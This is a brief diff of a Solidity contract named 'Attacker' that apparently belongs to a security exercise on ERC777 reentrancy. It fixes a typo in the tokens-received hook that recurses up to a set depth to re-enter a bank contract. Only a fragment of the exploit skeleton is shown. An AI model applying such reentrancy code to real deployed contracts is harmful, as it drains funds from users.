@@ -68,7 +68,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-    require(msg.sender == address(vank.token()), "Invalid token");
+    require(msg.sender == address(bank.token()), "Invalid token");
 
     if (depth < max_depth){
       depth++;
